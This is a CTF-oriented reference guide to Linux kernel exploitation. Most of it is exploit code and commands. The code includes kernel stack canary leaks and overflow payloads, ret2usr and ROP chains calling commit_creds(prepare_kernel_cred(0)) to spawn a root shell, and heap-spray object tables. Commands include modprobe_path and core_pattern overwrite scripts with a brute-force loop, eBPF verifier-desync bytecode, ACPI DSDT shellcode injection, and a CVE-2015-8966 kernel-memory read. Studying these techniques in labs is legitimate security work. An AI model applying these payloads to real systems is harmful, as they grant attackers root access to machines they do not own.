# CTF Pwn - Linux Kernel Exploitation

## Table of Contents
- [Environment Setup and Recon](#environment-setup-and-recon)
  - [QEMU Debug Environment](#qemu-debug-environment)
  - [Extracting vmlinux](#extracting-vmlinux)
  - [Kernel Config Checks](#kernel-config-checks)
  - [FGKASLR Detection](#fgkaslr-detection)
- [Useful Kernel Structures for Heap Spray](#useful-kernel-structures-for-heap-spray)
  - [tty_struct (kmalloc-1024)](#tty_struct-kmalloc-1024)
  - [tty_file_private (kmalloc-32)](#tty_file_private-kmalloc-32)
  - [poll_list (kmalloc-32 to 1024)](#poll_list-kmalloc-32-to-1024)
  - [user_key_payload (kmalloc-32 to 1024)](#user_key_payload-kmalloc-32-to-1024)
  - [setxattr Temporary Buffer (kmalloc-32 to 1024)](#setxattr-temporary-buffer-kmalloc-32-to-1024)
  - [seq_operations (kmalloc-32)](#seq_operations-kmalloc-32)
  - [subprocess_info (kmalloc-128)](#subprocess_info-kmalloc-128)
- [Kernel Stack Overflow and Canary Leak](#kernel-stack-overflow-and-canary-leak)
- [Privilege Escalation Primitives](#privilege-escalation-primitives)
  - [ret2usr (No SMEP/SMAP)](#ret2usr-no-smepsmap)
  - [Kernel ROP with prepare_kernel_cred / commit_creds](#kernel-rop-with-prepare_kernel_cred--commit_creds)
  - [Saving and Restoring Userland State](#saving-and-restoring-userland-state)
- [modprobe_path Overwrite](#modprobe_path-overwrite)
  - [Technique Overview](#technique-overview)
  - [Bruteforce Without Leak](#bruteforce-without-leak)
  - [Checking CONFIG_STATIC_USERMODEHELPER](#checking-config_static_usermodehelper)
- [core_pattern Overwrite](#core_pattern-overwrite)
- [Kernel Heap Overflow via kmalloc Size Mismatch (PlaidCTF 2013)](#kernel-heap-overflow-via-kmalloc-size-mismatch-plaidctf-2013)
- [eBPF Verifier Bypass Exploitation (UIUCTF 2021, D^3CTF 2022)](#ebpf-verifier-bypass-exploitation-uiuctf-2021-d3ctf-2022)
- [User-Kernel-Hypervisor Chain via I/O Port Hypercalls (HITCON 2018)](#user-kernel-hypervisor-chain-via-io-port-hypercalls-hitcon-2018)
- [ACPI DSDT Shellcode Injection for Privilege Escalation (hxp 2018)](#acpi-dsdt-shellcode-injection-for-privilege-escalation-hxp-2018)
- [ARM fcntl64 set_fs() CVE-2015-8966 Pipe Exfil (Insomnihack 2019)](#arm-fcntl64-set_fs-cve-2015-8966-pipe-exfil-insomnihack-2019)
For tty_struct kROP (kernel Return-Oriented Programming), userfaultfd race stabilization, SLUB internals, cross-cache attacks, and DiceCTF 2026 kernel patterns, see [kernel-techniques.md](kernel-techniques.md).

For protection bypass techniques (KASLR, FGKASLR, KPTI, SMEP, SMAP), GDB debugging, initramfs workflow, and exploit templates, see [kernel-bypass.md](kernel-bypass.md).

---

## Environment Setup and Recon

**Key insight:** Before writing any exploit, check the QEMU launch script for enabled mitigations (`smep`, `smap`, `kpti`, `kaslr`) and the `oops=panic` flag. These determine which exploitation techniques are viable. Disable all mitigations for initial debugging, then re-enable them one by one.

### QEMU Debug Environment

Standard QEMU launch script for kernel challenge debugging:

```bash
qemu-system-x86_64 \
  -kernel ./bzImage \
  -initrd ./rootfs.cpio \
  -nographic \
  -monitor none \
  -cpu qemu64 \
  -append "console=ttyS0 nokaslr panic=1" \
  -no-reboot \
  -s \
  -m 256M
```

- `-s` enables GDB on port 1234 (`target remote :1234`)
- `-append "nokaslr"` disables KASLR for debugging
- Check QEMU script for: `smep`, `smap`, `kaslr`, `oops=panic`, `kpti=1`
- If `oops=panic` is absent, kernel oops only kills the faulting process (exploitable for info leaks via dmesg)

**Disable mitigations for initial debugging** by modifying the launch script:
```bash
-append "console=ttyS0 nokaslr nopti nosmep nosmap quiet panic=1"
-cpu kvm64   # instead of kvm64,+smep,+smap
```

### Extracting vmlinux

**Extract vmlinux from bzImage:**
```bash
# Use extract-vmlinux.sh from Linux kernel source (scripts/extract-vmlinux)
./extract-vmlinux ./bzImage > vmlinux

# Extract ROP gadgets
ROPgadget --binary ./vmlinux > gadgets.txt
```

### Kernel Config Checks

| Config | Effect | How to Check |
|--------|--------|-------------|
| SMEP/SMAP/KASLR/KPTI | CPU-level mitigations | Check QEMU run script `-cpu` and `-append` flags |
| FGKASLR | Per-function randomization | `readelf -S vmlinux` section count (see below) |
| `SLAB_FREELIST_RANDOM` | Randomized freelist order | Sequential allocations not adjacent |
| `SLAB_FREELIST_HARDEN` | XOR-obfuscated free pointers | Check freelist pointers in GDB |
| `STATIC_USERMODEHELPER` | Blocks `modprobe_path` overwrite | Disassemble `call_usermodehelper_setup` |
| `KALLSYMS_ALL` | `.data` symbols in `/proc/kallsyms` | `grep modprobe_path /proc/kallsyms` |
| `CONFIG_USERFAULTFD` | Enables userfaultfd syscall | Try calling it; disabled = -ENOSYS |
| eBPF (extended Berkeley Packet Filter) JIT | JIT-compiled BPF filters | `cat /proc/sys/net/core/bpf_jit_enable` (0=off, 1=on, 2=debug) |

Check oops behavior:
- `oops=panic` in QEMU `-append` -> oops causes full kernel panic
- Without it -> oops kills the faulting process only; dmesg may leak stack/heap/kbase pointers

### FGKASLR Detection

Fine-Grained KASLR randomizes each function independently. Detect by counting ELF sections:

```bash
readelf -S vmlinux | tail -5
# FGKASLR disabled: ~30 sections
# FGKASLR enabled:  36000+ sections (one per function)

file vmlinux
# FGKASLR enabled: "too many section (36140)"
```

---

## Useful Kernel Structures for Heap Spray

These structures are allocated from standard `kmalloc` caches and controlled from userspace. Use them to fill freed slots for UAF exploitation or to leak kernel pointers.

**Key insight:** Match the vulnerable object's `kmalloc` cache size to choose the right spray structure. For kmalloc-32, use `seq_operations` or `tty_file_private`; for kmalloc-1024, use `tty_struct`; for variable sizes (32-1024), use `poll_list`, `user_key_payload`, or `setxattr`.

| Structure | Cache | Alloc Trigger | Free Trigger | Use |
|-----------|-------|---------------|--------------|-----|
| `tty_struct` | kmalloc-1024 | `open("/dev/ptmx")` | `close(fd)` | kbase leak, RIP hijack |
| `tty_file_private` | kmalloc-32 | `open("/dev/ptmx")` | `close(fd)` | kheap leak (points to `tty_struct`) |
| `poll_list` | kmalloc-32~1024 | `poll(fds, nfds, timeout)` | `poll()` returns | kheap leak, arbitrary free |
| `user_key_payload` | kmalloc-32~1024 | `add_key()` | `keyctl_revoke()`+GC | arbitrary value write |
| `setxattr` buffer | kmalloc-32~1024 | `setxattr()` | same call path | momentary arbitrary value write |
| `seq_operations` | kmalloc-32 | `open("/proc/self/stat")` | `close(fd)` | kbase leak, RIP hijack |
| `subprocess_info` | kmalloc-128 | internal kernel | internal kernel | kbase leak, RIP hijack |

### tty_struct (kmalloc-1024)

Allocated when `open("/dev/ptmx")`, freed on `close()`. Size: 0x2B8 bytes.

```c
struct tty_struct {
    int magic;                    // +0x00: must be 0x5401 (paranoia check)
    struct kref kref;             // +0x04: reference count
    struct device *dev;           // +0x08
    struct tty_driver *driver;    // +0x10: must be valid kheap pointer
    const struct tty_operations *ops; // +0x18: vtable pointer -> kbase leak
    // ...
};
```

- **kbase leak:** Read `tty_struct.ops` -- points to `ptm_unix98_ops` (or similar) in kernel `.data`
- **RIP hijack:** Overwrite `tty_struct.ops` with pointer to fake vtable, then `ioctl()` calls `tty->ops->ioctl()`
- **magic** must remain `0x5401` or `tty_ioctl()` returns immediately (paranoia check)
- **driver** must be a valid kernel heap pointer or the kernel will oops

### tty_file_private (kmalloc-32)

Allocated alongside `tty_struct` in `tty_alloc_file()`. Size: 0x20 bytes.

```c
struct tty_file_private {
    struct tty_struct *tty;   // +0x00: pointer to tty_struct in kmalloc-1024
    struct file *file;        // +0x08
    struct list_head list;    // +0x10
};
```

- **kheap leak:** Read `tty_file_private.tty` to get address in `kmalloc-1024`

### poll_list (kmalloc-32 to 1024)

Allocated during `poll()`, freed when `poll()` completes (timer expiry or event trigger). Cache size depends on number of fds polled.

```c
struct poll_list {
    struct poll_list *next;   // +0x00: linked list pointer
    int len;                  // +0x08: number of entries
    struct pollfd entries[];  // +0x0C: variable-length array
};
```

- **Arbitrary free:** Overwrite `poll_list.next` -> when `poll()` finishes, it frees all entries in the linked list including the corrupted pointer -> UAF on arbitrary address

### user_key_payload (kmalloc-32 to 1024)

Allocated via `add_key()` syscall. Cache size depends on `data` length.

```c
struct user_key_payload {
    struct callback_head rcu;     // +0x00: 16 bytes, untouched until init
    unsigned short datalen;       // +0x10
    char data[];                  // +0x18: user-controlled content
};
```

- First 16 bytes are uninitialized until GC callback -- combine with UAF to leak residual heap data
- Free requires `keyctl_revoke()` then wait for GC
- Blocked by default Docker seccomp profile

### setxattr Temporary Buffer (kmalloc-32 to 1024)

`setxattr("file", "user.x", data, size, XATTR_CREATE)` allocates a buffer, copies user data, then frees it in the same call path.

- **Momentary write:** Combine with uninitialized structs to write arbitrary values into freed chunks
- Cannot be used for persistent spray (freed immediately)
- The file passed to `setxattr()` must exist -- common pitfall when exploit runs from different directory than expected

### seq_operations (kmalloc-32)

Allocated when opening `/proc/self/stat` (or similar seq_file). Contains function pointers for kbase leak.

### subprocess_info (kmalloc-128)

Internal kernel struct with function pointers. Useful for kbase leak and RIP hijack in specific scenarios.

---

## Kernel Stack Overflow and Canary Leak

Kernel modules with vulnerable read/write handlers often allow stack buffer overflow. The exploitation pattern mirrors userland stack overflows but with kernel-specific register state management.

**Canary leak via oversized read (hxp CTF 2020):**

A vulnerable `hackme_read()` copies from a 32-element stack array `tmp[32]` but allows reading up to 0x1000 bytes -- leaking the stack canary and kernel text pointers beyond the buffer.

```c
unsigned long leak[40];
int fd = open("/dev/hackme", O_RDWR);

// Read beyond stack buffer to leak canary + kernel pointers
read(fd, leak, sizeof(leak));

// Stack layout: tmp[32] at rbp-0x98, canary at rbp-0x18
// Canary at index 16 (offset 0x80 from buffer start)
unsigned long cookie = leak[16];

// Kernel text pointer at index 38 -> compute KASLR base
unsigned long kernel_base = (leak[38] & 0xffffffffffff0000);
long kaslr_offset = kernel_base - 0xffffffff81000000;
```

**Stack overflow payload structure:**

```c
unsigned long payload[50];
int off = 16;                    // offset to canary position
payload[off++] = cookie;         // canary
payload[off++] = 0x0;            // padding (rbx)
payload[off++] = 0x0;            // padding (r12)
payload[off++] = 0x0;            // saved rbp
payload[off++] = rop_start;      // return address -> ROP chain
// ... ROP chain follows ...
write(fd, payload, sizeof(payload));
```

**ioctl-based size check bypass (K3RN3LCTF 2021):**

Some modules gate write length against a global `MaxBuffer` variable that is itself controllable via `ioctl()`:

```c
// Vulnerable pattern in module:
// swrite() checks: if (MaxBuffer < user_size) return -EFAULT;
// sioctl() with cmd 0x20: MaxBuffer = (int)arg;  <- attacker-controlled

// Exploit: increase MaxBuffer before overflow
int fd = open("/proc/pwn_device", O_RDWR);
ioctl(fd, 0x20, 300);            // set MaxBuffer to 300 (buffer is only 128)
write(fd, overflow_payload, 300); // now passes size check -> stack overflow
```

**Key insight:** Kernel stack canaries work identically to userland canaries. A vulnerable read handler that copies more bytes than the buffer size leaks the canary and saved registers, including kernel text pointers for KASLR bypass. Look for `ioctl` handlers that modify global variables used in bounds checks -- they often bypass write size restrictions.

---

## Privilege Escalation Primitives

### ret2usr (No SMEP/SMAP)

When SMEP and SMAP are disabled, the kernel can directly execute userland code and access userland memory. Hijack RIP to a userland function that calls `prepare_kernel_cred(0)` and `commit_creds()`.

```c
// Addresses from /proc/kallsyms (or leak)
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
unsigned long commit_creds       = 0xffffffff814c6410;

// Saved userland state for iretq return
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void privesc() {
    __asm__(".intel_syntax noprefix;"
        "movabs rax, %[prepare_kernel_cred];"
        "xor rdi, rdi;"        // prepare_kernel_cred(NULL) -> init cred
        "call rax;"
        "mov rdi, rax;"        // commit_creds(new_cred)
        "movabs rax, %[commit_creds];"
        "call rax;"
        "swapgs;"              // restore GS base for userland
        "mov r15, %[user_ss];   push r15;"
        "mov r15, %[user_sp];   push r15;"
        "mov r15, %[user_rflags]; push r15;"
        "mov r15, %[user_cs];   push r15;"
        "mov r15, %[user_rip];  push r15;"
        "iretq;"               // return to userland as root
        ".att_syntax;"
        : : [prepare_kernel_cred] "r"(prepare_kernel_cred),
            [commit_creds] "r"(commit_creds),
            [user_ss] "r"(user_ss), [user_sp] "r"(user_sp),
            [user_rflags] "r"(user_rflags),
            [user_cs] "r"(user_cs), [user_rip] "r"(user_rip));
}
```

After `privesc()` returns to userland, the process has root credentials. Call `system("/bin/sh")` to get a root shell.

### Kernel ROP with prepare_kernel_cred / commit_creds

When SMEP is enabled, build a kernel ROP chain to call `prepare_kernel_cred(0)` -> pass result to `commit_creds()` -> return to userland.

```c
// Find gadgets: ropr --no-uniq -R "^pop rdi; ret;|^mov rdi, rax" ./vmlinux
unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long mov_rdi_rax_pop1_ret = 0xffffffff816bf740; // mov rdi, rax; ...; pop rbx; ret
unsigned long swapgs_pop1_ret = 0xffffffff8100a55f;      // swapgs; pop rbp; ret
unsigned long iretq = 0xffffffff8100c0d9;

unsigned long payload[50];
int off = 16;   // canary offset
payload[off++] = cookie;
payload[off++] = 0;           // rbx
payload[off++] = 0;           // r12
payload[off++] = 0;           // rbp

// ROP chain: prepare_kernel_cred(0) -> commit_creds(result)
payload[off++] = pop_rdi_ret;
payload[off++] = 0x0;                      // rdi = NULL
payload[off++] = prepare_kernel_cred;
payload[off++] = mov_rdi_rax_pop1_ret;     // rdi = rax (new cred)
payload[off++] = 0x0;                      // pop rbx padding
payload[off++] = commit_creds;

// Return to userland
payload[off++] = swapgs_pop1_ret;
payload[off++] = 0x0;                      // pop rbp padding
payload[off++] = iretq;
payload[off++] = user_rip;                 // spawn_shell
payload[off++] = user_cs;                  // 0x33
payload[off++] = user_rflags;
payload[off++] = user_sp;
payload[off++] = user_ss;                  // 0x2b
```

**Critical gadget: `mov rdi, rax`** -- needed to pass the return value of `prepare_kernel_cred()` (in RAX) to `commit_creds()` (expects argument in RDI). Search for variants like `mov rdi, rax; ... ; ret` that may clobber other registers.

**Tool:** `ropr` is faster than ROPgadget for large kernel images:
```bash
ropr --no-uniq -R "^pop rdi; ret;|^mov rdi, rax|^swapgs|^iretq" ./vmlinux
```

### Saving and Restoring Userland State

Before triggering the kernel exploit, save userland register state for the `iretq` return:

```c
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void save_userland_state() {
    __asm__(".intel_syntax noprefix;"
        "mov %[cs], cs;"
        "mov %[ss], ss;"
        "mov %[sp], rsp;"
        "pushf; pop %[rflags];"
        ".att_syntax;"
        : [cs] "=r"(user_cs), [ss] "=r"(user_ss),
          [sp] "=r"(user_sp), [rflags] "=r"(user_rflags));
    user_rip = (unsigned long)spawn_shell;  // function to call after return
}

void spawn_shell() {
    if (getuid() == 0) {
        printf("[+] root!\n");
        system("/bin/sh");
    } else {
        printf("[-] privesc failed\n");
        exit(1);
    }
}
```

**Register values (x86_64 userland):**
- `CS` = 0x33 (64-bit user code segment)
- `SS` = 0x2b (64-bit user stack segment)
- `RSP` = current userland stack pointer
- `RFLAGS` = current flags register
- `RIP` = address of post-exploit function (e.g., `spawn_shell`)

---

## modprobe_path Overwrite

### Technique Overview

Overwrite the global `modprobe_path` variable (default: `"/sbin/modprobe"`) with a path to an attacker-controlled script. When the kernel encounters a binary with an unknown format, it executes `modprobe_path` as root.

**Requirements:**
1. Arbitrary Address Write (AAW) to overwrite `modprobe_path`
2. Ability to create two files: a malformed binary and an evil script
3. `CONFIG_STATIC_USERMODEHELPER` is disabled

**Steps:**

```bash
# 1. Write evil script
echo '#!/bin/sh' > /tmp/evil.sh
echo 'cat /flag > /tmp/output' >> /tmp/evil.sh
echo 'chmod 777 /tmp/output' >> /tmp/evil.sh
chmod +x /tmp/evil.sh

# 2. Overwrite modprobe_path with "/tmp/evil.sh" using your AAW primitive

# 3. Create and execute a malformed binary (non-printable first 4 bytes)
echo -ne '\xff\xff\xff\xff' > /tmp/trigger
chmod +x /tmp/trigger
/tmp/trigger

# 4. Read the flag
cat /tmp/output
```

**How it works:** `execve()` -> `search_binary_handler()` -> no format matches -> `request_module("binfmt-XXXX")` -> `call_modprobe()` -> executes `modprobe_path` as root.

**Key insight:** The first 4 bytes of the trigger binary must be non-printable (not ASCII without tab/newline). If they are printable, the kernel skips the `request_module()` call.

### Bruteforce Without Leak

`modprobe_path` has only 1 byte of entropy under KASLR (the randomized page offset). With AAW, brute-force the address:

```python
# modprobe_path base address (from debugging without KASLR)
MODPROBE_BASE = 0xffffffff8265ff00
# Under KASLR, only the 0x65 byte varies
# Try 256 offsets
for byte_guess in range(256):
    addr = (MODPROBE_BASE & ~0xFF0000) | (byte_guess << 16)
    write_string(addr, "/tmp/evil.sh")
    trigger_modprobe()
```

### Checking CONFIG_STATIC_USERMODEHELPER

If enabled, `call_usermodehelper_setup()` ignores `modprobe_path` and uses a hardcoded constant.

**Detection via disassembly:**

```bash
# 1. Get function address
cat /proc/kallsyms | grep call_usermodehelper_setup

# 2. Set GDB breakpoint and trigger
echo -ne '\xff\xff\xff\xff' > /tmp/nirugiri && chmod +x /tmp/nirugiri && /tmp/nirugiri

# 3. In GDB, disassemble and check:
# NOT set: rdi saved into r14 at +9, used at +127 -> modprobe_path passed through
# SET: immediate constant at +122 instead of r14 -> 1st arg (modprobe_path) ignored
```

**When set:** `sub_info->path = CONFIG_STATIC_USERMODEHELPER_PATH` (constant). Overwriting `modprobe_path` has no effect. Look for alternative LPE techniques.

---

## core_pattern Overwrite

Alternative to `modprobe_path`. Overwrite `/proc/sys/kernel/core_pattern` (or the internal `core_pattern` variable) with a pipe command. When a process crashes, the kernel executes the specified command as root to handle the core dump.

```bash
# core_pattern with pipe: first char '|' means execute as command
# Overwrite core_pattern to: "|/tmp/evil.sh"
# Then crash a process to trigger
```

**Finding the offset:** `core_pattern` is not exported via `/proc/kallsyms` without `CONFIG_KALLSYMS_ALL`. To find it:

1. Set breakpoint on `override_creds()` (called by `do_coredump()`)
2. Crash a process: `int main() { ((void(*)())0)(); }`
3. After `override_creds` returns, disassemble -- look for `movzx` loading from a data address
4. That address is `core_pattern`

**Key insight:** `core_pattern` is an alternative to `modprobe_path` when `CONFIG_STATIC_USERMODEHELPER` blocks modprobe. Overwrite it with `|/tmp/evil.sh` and crash any process to trigger root command execution. Finding the address requires a GDB breakpoint on `override_creds` during a deliberate crash since `core_pattern` is not always exported in `/proc/kallsyms`.

```text
(gdb) finish
(gdb) x/5i $rip
=> 0xffffffff811b1e98:  movzx r13d, BYTE PTR [rip+0xcfec80]  # 0xffffffff81eb0b20
(gdb) x/s 0xffffffff81eb0b20
0xffffffff81eb0b20: "core"
```

---

## Kernel Heap Overflow via kmalloc Size Mismatch (PlaidCTF 2013)

**Pattern:** Kernel module allocates `kmalloc(content_length)` but copies `0x40 + content_length` bytes (header + body), causing a 0x40-byte heap overflow into adjacent slab objects.

```c
// Vulnerable pattern in kernel HTTP handler:
buf = kmalloc(content_length, GFP_KERNEL);
memcpy(buf, http_header, 0x40);           // 0x40 bytes of header
memcpy(buf + 0x40, body, content_length); // Overflow!
```

**Exploitation:**
1. **Slab spray:** Open 1021 file descriptors (`open("/dev/kmalloc_target")`) to fill the kmalloc-256 slab cache
2. **Create holes:** Close 3 files to create gaps in the slab for the overflowing allocation
3. **Trigger overflow:** Send HTTP request with body that overflows into adjacent `struct file`
4. **Corrupt `f_op`:** Overwrite the `f_op` (file operations) pointer in the adjacent `struct file` to redirect function pointers
5. **Hijack write handler:** `f_op->write` now points to attacker-controlled address → `commit_creds(prepare_kernel_cred(0))`

**Key insight:** `struct file` is in kmalloc-256 and contains `f_op` (function pointer table). Corrupting `f_op` to a fake vtable gives control over any file operation (`read`, `write`, `ioctl`). The attacker triggers the hijacked operation via the corrupted file descriptor.

---

## eBPF Verifier Bypass Exploitation (UIUCTF 2021, D^3CTF 2022)

Exploit mismatches between the eBPF verifier's static analysis and runtime behavior to achieve arbitrary kernel read/write.

```c
// Pattern: Verifier tracks register states differently from hardware
// Example: Right-shift desynchronization (D^3CTF 2022)
// Verifier thinks: shr reg, 64 -> reg = 0
// Hardware does:   shr reg, 64 -> reg = original_value (shift >= width = undefined)

// Step 1: Create desynchronized register
BPF_ALU64_IMM(BPF_RSH, BPF_REG_7, 64),  // verifier: R7=0, runtime: R7=1

// Step 2: Use desync to bypass ALU sanitizer
BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, offset),  // verifier: 0*offset=0, runtime: 1*offset=offset

// Step 3: Add to map pointer for OOB access
BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_7),  // verifier allows (adding 0)
// Runtime: map_ptr + offset -> arbitrary kernel memory access

// Step 4: Read/write kernel memory, overwrite modprobe_path or cred struct
```

```bash
# eBPF exploitation workflow:
# 1. Find verifier vs runtime mismatch (RSH, bounds tracking, helper params)
# 2. Create register with verifier_value != runtime_value
# 3. Use desync register to bypass pointer arithmetic checks
# 4. Achieve arbitrary read via map value OOB
# 5. Leak kernel base from adjacent slab objects
# 6. Arbitrary write to modprobe_path or current->cred

# Helper function overflow variant (d3bpf-v2):
# bpf_skb_load_bytes(skb, offset, stack_buf, len)
# Verifier checks len <= 512, but desync makes runtime len huge
# Stack buffer overflow -> ROP to commit_creds(init_cred)

# KASLR bypass via eBPF:
# Trigger controlled oops -> dmesg leaks kernel addresses
# Or: read adjacent slab objects containing kernel pointers
```

**Key insight:** eBPF verifier bugs create a "type confusion" between static analysis and runtime. The pattern is always: (1) find operation where verifier prediction differs from hardware, (2) multiply the difference to create useful offsets, (3) add to map pointer for kernel memory access. Check kernel changelogs for eBPF verifier patches -- each patch implies a prior exploitable bug.

See also: [kernel-techniques.md](kernel-techniques.md) for additional kernel exploitation techniques.

---

## User-Kernel-Hypervisor Chain via I/O Port Hypercalls (HITCON 2018)

**Pattern:** A three-layer challenge (user.elf → kernel.bin → hypervisor) restricts direct hypercalls from userspace via a whitelist enforced in kernel.bin. The attacker (1) corrupts a RPN-calculator user-mode program to write arbitrary bytes into its GOT, (2) uses that write to break out to kernel mode, and (3) from kernel mode issues a hypercall directly by executing `out dx, eax` on I/O ports `0x8000..0x80FF`, which the hypervisor handles as a syscall dispatch. The final twist: the hypervisor only accepts strings that already live in kernel memory, so a deliberately failing `open()` syscall is used to seed a kernel buffer with the target path before re-invoking the hypercall with that buffer address.

```asm
; Kernel-mode stub running inside kernel.bin after the pivot
mov dx, 0x8000 + 5          ; I/O port = base + syscall_number (here: open)
mov eax, <kernel_buffer>    ; pointer that lives in kernel memory
out dx, eax                 ; hypervisor reads from the port as an arg

mov dx, 0x8000 + 0          ; syscall 0 = read
mov eax, flag_buffer
out dx, eax
```

```python
# User-mode payload that pivots into kernel.bin via GOT overwrite
from pwn import *
io = remote("challenge.hitcon", 1337)

# 1. RPN-calc overwrites got['strtol'] with a kernel gadget that calls the
#    privileged hypercall stub.
payload = rpn_overwrite(target="strtol",
                        value=kernel_gadget_address)
io.sendline(payload)

# 2. Kernel stub runs the I/O-port sequence above and writes the flag back.
io.recvuntil(b"flag{")
log.success(b"flag{" + io.recvuntil(b"}"))
```

**Key insight:** The more privilege rings a challenge stacks, the more important it is to map *where data must live* versus *where code must run*. HITCON Abyss enforced a kernel whitelist on userspace hypercalls, but kernel code itself could still poke the hypervisor ports directly. The same pattern recurs in real VM escapes: a guest kernel primitive plus an I/O-port write reaches the VMM without going through the guest's own syscall table. When attacking `kvm_guest_enter` style hypervisors, look for memory-mapped I/O regions or port ranges that the VMM traps — they are hypercalls in disguise and often lack the argument sanitisation that formal hypercall interfaces require.

**References:** HITCON CTF 2018 — Abyss I & II, writeups 11918, 11919, 11933, 11934, 11937, 11938

---

## ACPI DSDT Shellcode Injection for Privilege Escalation (hxp 2018)

**Pattern:** "Green Computing" style challenges boot a kernel with attacker-controlled ACPI tables. Embed shellcode inside a DSDT `OperationRegion(SystemMemory, ...)` and write it into kernel memory with a `Field` write at boot. Patch a target like `commit_creds` so any subsequent setuid call elevates privileges.

```asl
OperationRegion (PWDN, SystemMemory, 0x1241000, 0x400)
Field (PWDN, AnyAcc, NoLock, Preserve) { JMPA, 0x400 }
JMPA = Buffer () { 0x41, 0x55, 0x41, 0x54, 0x48, /* shellcode */ }

OperationRegion (NISC, SystemMemory, 0x104ac24, 96)
Field (NISC, AnyAcc, NoLock, Preserve) { NICD, 768 }
NICD = Buffer () { 0x48, 0xc7, 0xc0, /* patched commit_creds prologue */ }
```

**Key insight:** ACPI AML runs with direct physical memory access before normal kernel protections are active. When the challenge lets you supply DSDT/SSDT bytes, `SystemMemory` `OperationRegion` is a kernel-write primitive bigger than most explicit kernel bugs.

**References:** hxp CTF 2018 — Green Computing 1-2, writeups 12550+

---

## ARM fcntl64 set_fs() CVE-2015-8966 Pipe Exfil (Insomnihack 2019)

**Pattern:** Bug: `fcntl64` on ARM Linux set `KERNEL_DS` via `set_fs()` and never restored it. Exploit: fork a child that calls `fcntl64`, then have the child write arbitrary kernel addresses through a pipe; parent reads the pipe back. Direct reads of MMU regions panic, so pipes act as a safe shim.

```c
if (fork() == 0) {
    trigger_fcntl64_bug();                // now at KERNEL_DS
    write(pipe_w, (void*)kernel_addr, N); // unchecked kernel read
    _exit(0);
}
read(pipe_r, leak, N);                    // parent gets kernel memory
```

After leaking the cred struct, rewrite `uid/gid/euid/egid = 0` in place and call `getuid()` to confirm root.

**Key insight:** Missing `set_fs(USER_DS)` restoration is a single-line bug that gives unbounded copy_from/to_user with kernel addresses. Wrap dangerous reads through a pipe so the kernel copy loop never touches forbidden MMU regions directly.

**References:** Insomnihack teaser 2019 — 1118daysober, writeup 12903
